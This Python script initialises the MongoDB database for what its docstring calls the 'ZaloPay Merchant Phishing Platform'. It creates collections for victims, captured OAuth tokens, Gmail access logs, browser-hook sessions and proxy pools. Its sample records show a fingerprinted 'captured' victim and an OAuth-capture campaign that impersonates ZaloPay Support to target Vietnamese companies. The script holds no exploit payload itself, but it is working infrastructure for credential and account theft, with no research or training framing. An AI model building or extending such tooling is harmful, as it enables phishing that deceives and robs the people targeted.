#!/usr/bin/env python3
"""
MongoDB Schema Initialization Script
Initialize complete MongoDB schema for the ZaloPay Merchant Phishing Platform
"""

import os
import sys
import asyncio
import argparse
import logging
from datetime import datetime, timezone

# Add the backend directory to the Python path
sys.path.append(os.path.join(os.path.dirname(__file__), '..'))

from database.mongodb.schema_manager import initialize_mongodb_schema, get_mongodb_manager
from database.retention_manager import initialize_data_retention_manager

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

def initialize_database(connection_string: str = None, database_name: str = "zalopay_phishing"):
    """Initialize the complete database schema"""
    try:
        logger.info("Initializing MongoDB schema")
        
        # Initialize MongoDB schema
        mongodb_manager = initialize_mongodb_schema(connection_string, database_name)
        
        # Initialize data retention manager
        retention_manager = initialize_data_retention_manager(mongodb_manager.db)
        
        logger.info("Database initialization completed successfully")
        
        # Get database statistics
        stats = mongodb_manager.get_database_stats()
        logger.info(f"Database Statistics: {stats}")
        
        return True
        
    except Exception as e:
        logger.error(f"Error initializing database: {e}")
        return False

def verify_schema():
    """Verify that the schema is properly initialized"""
    try:
        logger.info("Verifying database schema")
        
        mongodb_manager = get_mongodb_manager()
        
        # Check if all collections exist
        expected_collections = [
            "victims", "oauth_tokens", "admin_users", "campaigns",
            "activity_logs", "gmail_access_logs", "beef_sessions",
            "conversion_events", "attribution_events", "proxy_pools",
            "system_metrics", "encryption_keys", "audit_logs",
            "archive_metadata", "aggregation_pipelines"
        ]
        
        existing_collections = mongodb_manager.db.list_collection_names()
        missing_collections = set(expected_collections) - set(existing_collections)
        
        if missing_collections:
            logger.error(f"Missing collections: {missing_collections}")
            return False
        
        # Check if indexes exist
        for collection_name in expected_collections:
            collection = mongodb_manager.get_collection(collection_name)
            if collection:
                indexes = collection.list_indexes()
                index_count = len(list(indexes))
                logger.info(f"Collection {collection_name}: {index_count} indexes")
        
        logger.info("Schema verification completed successfully")
        return True
        
    except Exception as e:
        logger.error(f"Error verifying schema: {e}")
        return False

def test_aggregation_pipelines():
    """Test aggregation pipelines"""
    try:
        logger.info("Testing aggregation pipelines")
        
        mongodb_manager = get_mongodb_manager()
        
        # Test victim analytics pipeline
        try:
            result = mongodb_manager.execute_aggregation("victims", "victim_analytics")
            logger.info(f"Victim analytics pipeline: {len(result)} results")
        except Exception as e:
            logger.warning(f"Victim analytics pipeline test failed: {e}")
        
        # Test campaign conversion funnel pipeline
        try:
            result = mongodb_manager.execute_aggregation("victims", "conversion_funnel")
            logger.info(f"Conversion funnel pipeline: {len(result)} results")
        except Exception as e:
            logger.warning(f"Conversion funnel pipeline test failed: {e}")
        
        # Test Gmail stats pipeline
        try:
            result = mongodb_manager.execute_aggregation("gmail_access_logs", "gmail_stats")
            logger.info(f"Gmail stats pipeline: {len(result)} results")
        except Exception as e:
            logger.warning(f"Gmail stats pipeline test failed: {e}")
        
        # Test system performance pipeline
        try:
            result = mongodb_manager.execute_aggregation("system_metrics", "system_performance")
            logger.info(f"System performance pipeline: {len(result)} results")
        except Exception as e:
            logger.warning(f"System performance pipeline test failed: {e}")
        
        logger.info("Aggregation pipeline testing completed")
        return True
        
    except Exception as e:
        logger.error(f"Error testing aggregation pipelines: {e}")
        return False

def create_sample_data():
    """Create sample data for testing"""
    try:
        logger.info("Creating sample data")
        
        mongodb_manager = get_mongodb_manager()
        
        # Sample victim data
        sample_victim = {
            "victim_id": "victim_001",
            "email": "test@example.com",
            "password": "hashed_password",
            "first_name": "John",
            "last_name": "Doe",
            "company": "Test Company",
            "job_title": "Manager",
            "country": "VN",
            "city": "Ho Chi Minh City",
            "ip_address": "192.168.1.100",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "device_type": "desktop",
            "browser": "Chrome",
            "os": "Windows",
            "screen_resolution": "1920x1080",
            "timezone": "Asia/Ho_Chi_Minh",
            "language": "vi",
            "status": "active",
            "created_at": datetime.now(timezone.utc),
            "updated_at": datetime.now(timezone.utc),
            "last_seen": datetime.now(timezone.utc),
            "campaign_id": "campaign_001",
            "session_id": "session_001",
            "fingerprint": {
                "canvas": "test_canvas_fingerprint",
                "webgl": "test_webgl_fingerprint",
                "audio": "test_audio_fingerprint"
            },
            "business_intelligence": {
                "industry": "technology",
                "company_size": "medium",
                "revenue": 1000000,
                "employee_count": 50
            },
            "intelligence_score": 85,
            "risk_level": "high",
            "exploitation_status": {
                "oauth_completed": True,
                "gmail_accessed": False,
                "beef_session": False
            },
            "tags": ["high_value", "vietnamese", "tech_company"],
            "notes": "Sample victim for testing",
            "encrypted_data": {}
        }
        
        # Insert sample victim
        victims_collection = mongodb_manager.get_collection("victims")
        victims_collection.insert_one(sample_victim)
        
        # Sample campaign data
        sample_campaign = {
            "campaign_id": "campaign_001",
            "name": "Test Campaign",
            "description": "Sample campaign for testing",
            "campaign_type": "oauth_capture",
            "status": "active",
            "created_by": "admin_001",
            "created_at": datetime.now(timezone.utc),
            "updated_at": datetime.now(timezone.utc),
            "targeting": {
                "method": "geographic",
                "countries": ["VN"],
                "industries": ["technology"],
                "domains": []
            },
            "content": {
                "landing_page_template": "zalopay_merchant",
                "email_template": "welcome_email",
                "subject_line": "Welcome to ZaloPay",
                "sender_name": "ZaloPay Support",
                "sender_email": "support@zalopay.vn"
            },
            "delivery": {
                "start_time": datetime.now(timezone.utc),
                "end_time": None,
                "delivery_schedule": "immediate",
                "batch_size": 100
            },
            "analytics": {
                "track_opens": True,
                "track_clicks": True,
                "track_conversions": True
            },
            "tags": ["test", "sample"],
            "notes": "Sample campaign for testing",
            "version": 1
        }
        
        # Insert sample campaign
        campaigns_collection = mongodb_manager.get_collection("campaigns")
        campaigns_collection.insert_one(sample_campaign)
        
        # Sample activity log
        sample_activity = {
            "log_id": "log_001",
            "action": "victim_captured",
            "timestamp": datetime.now(timezone.utc),
            "source": "campaign_001",
            "victim_id": "victim_001",
            "campaign_id": "campaign_001",
            "admin_id": "admin_001",
            "session_id": "session_001",
            "ip_address": "192.168.1.100",
            "user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "details": {
                "capture_method": "oauth",
                "landing_page": "zalopay_merchant",
                "fingerprint_score": 85
            },
            "severity": "info",
            "category": "victim_acquisition",
            "tags": ["victim", "capture", "oauth"]
        }
        
        # Insert sample activity log
        activity_collection = mongodb_manager.get_collection("activity_logs")
        activity_collection.insert_one(sample_activity)
        
        logger.info("Sample data created successfully")
        return True
        
    except Exception as e:
        logger.error(f"Error creating sample data: {e}")
        return False

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description="MongoDB Schema Initialization Script")
    parser.add_argument("--action", choices=["init", "verify", "test", "sample"], 
                       default="init", help="Action to perform")
    parser.add_argument("--connection-string", help="MongoDB connection string")
    parser.add_argument("--database-name", default="zalopay_phishing", help="Database name")
    parser.add_argument("--verbose", "-v", action="store_true", help="Enable verbose logging")
    
    args = parser.parse_args()
    
    # Set logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    
    # Run the appropriate action
    try:
        if args.action == "init":
            success = initialize_database(args.connection_string, args.database_name)
            sys.exit(0 if success else 1)
        
        elif args.action == "verify":
            success = verify_schema()
            sys.exit(0 if success else 1)
        
        elif args.action == "test":
            success = test_aggregation_pipelines()
            sys.exit(0 if success else 1)
        
        elif args.action == "sample":
            success = create_sample_data()
            sys.exit(0 if success else 1)
        
    except KeyboardInterrupt:
        logger.info("Operation cancelled by user")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()
